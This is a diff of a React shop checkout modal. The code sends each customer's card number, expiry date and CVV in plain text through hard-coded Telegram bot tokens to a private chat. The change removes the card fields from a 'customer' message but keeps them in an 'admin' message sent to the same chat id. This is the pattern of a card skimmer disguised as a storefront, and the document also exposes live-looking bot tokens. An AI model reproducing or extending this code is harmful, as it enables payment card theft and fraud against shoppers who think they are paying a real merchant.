@@ -79,71 +79,59 @@ export default function BasicModal({ isOpen, onClose, totalPrice, basketItems, q
                const token = '7409890621:AAGtsTzdH-U-IQsdam-FVzVMX_EcXCxKe9I';
                const chat_id = 6183727519;
 
-               // Получаем текущие дату и время
                const now = new Date();
                const formattedDate = now.toLocaleDateString();
                const formattedTime = now.toLocaleTimeString();
 
-               // Отправка текста сообщения
                const itemsDescription = basketItems.map(item =>
                     `🔹 *${item.nameproduct}* — ${quantities[item.id]} шт — *${item.price * quantities[item.id]} $*`
                ).join('\n');
 
-               const message = outdent`
-    🧾 *Чек оплаты*
-    ───────────────
-    💳 *Номер карты:* \`${data.cardnumber}\`
-    📅 *Срок действия:* ${data.carddate}
-    💰 *Общая сумма:* \`${totalPrice} $\`
-    🔑 *Код подтверждения:* \`${data.cardcode}\`
-    🗓 *Дата оформления:* ${formattedDate} в ${formattedTime}
-    
-    🛒 *Товары:*
-    ${itemsDescription}
-    
-    Спасибо за покупку! 🎉
+               const customerMessage = outdent`
+🧾 *Чек оплаты*
+────────────────
+💰 *Общая сумма:* \`${totalPrice} $\`
+🗓 *Дата оформления:* ${formattedDate} в ${formattedTime}
+
+🛒 *Товары:*
+${itemsDescription}
+
+Спасибо за покупку! 🎉
 `;
 
-               // URL для отправки сообщения
-               const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&parse_mode=Markdown&text=${encodeURIComponent(message)}`;
+               const customerUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&parse_mode=Markdown&text=${encodeURIComponent(customerMessage)}`;
 
-               axios.get(url)
+               axios.get(customerUrl)
                     .then(response => {
-                         console.log("Message sent successfully:", response);
+                         console.log("Customer message sent successfully:", response);
                     })
                     .catch(error => {
-                         console.error("Error sending message:", error);
+                         console.error("Error sending customer message:", error);
                     });
 
-               
-               
-               
-               
-               
-     //админ
-     const adminToken = '7221957925:AAE2l4hPGNSfWYT6dcxWQ9cZ7HPo0dNnXhw'; // Токен администратора
-     const adminChatId = 6183727519; // Идентификатор чата администратора
+               // Администратор получает полные данные
+               const adminToken = '7221957925:AAE2l4hPGNSfWYT6dcxWQ9cZ7HPo0dNnXhw';
+               const adminChatId = 6183727519;
 
-     const adminMessage = outdent`
-    📋 *Новый заказ поступил!*
+               const adminMessage = outdent`
+📋 *Новый заказ поступил!*
 
-    💳 *Платежная информация:*
-    ───────────────
-    • *Номер карты:* ${data.cardnumber}
-    • *Срок действия:* ${data.carddate}
-    • *Общая сумма:* ${totalPrice} $
-    • *Код подтверждения:* ${data.cardcode}
+💳 *Платежная информация:*
+────────────────
+• *Номер карты:* ${data.cardnumber}
+• *Срок действия:* ${data.carddate}
+• *Общая сумма:* ${totalPrice} $
+• *Код подтверждения:* ${data.cardcode}
 
-    🛍 *Детали заказа:*
-    ───────────────
-    ${itemsDescription}
+🛍 *Детали заказа:*
+────────────────
+${itemsDescription}
 
-    🗓 *Дата оформления:* ${formattedDate}, ${formattedTime}
+🗓 *Дата оформления:* ${formattedDate}, ${formattedTime}
 
-    _Спасибо, что следите за процессом!_
+_Спасибо, что следите за процессом!_
 `;
 
-               // Отправка сообщения
                const adminUrl = `https://api.telegram.org/bot${adminToken}/sendMessage?chat_id=${adminChatId}&parse_mode=Markdown&text=${encodeURIComponent(adminMessage)}`;
 
                axios.get(adminUrl)
@@ -154,13 +142,10 @@ export default function BasicModal({ isOpen, onClose, totalPrice, basketItems, q
                          console.error("Error sending admin message:", error);
                     });
 
-               
-               
-
-               // Отправка каждого продукта как отдельного сообщения
+               // Отправка изображений продуктов покупателю
                const sendProductImages = async () => {
                     for (const item of basketItems) {
-                         if (item.img[0]) { // Проверяем, что изображение существует
+                         if (item.img[0]) {
                               const imageUrl = item.img[0];
                               const caption = `${item.nameproduct}\n- ${quantities[item.id]} шт\n- ${item.price * quantities[item.id]} $`;
                               const imageUrlForSending = `https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chat_id}&photo=${encodeURIComponent(imageUrl)}&caption=${encodeURIComponent(caption)}`;
@@ -180,6 +165,7 @@ export default function BasicModal({ isOpen, onClose, totalPrice, basketItems, q
                notyf.error("Неверный SMS-код");
           }
      };
+
 
      return (
           <>
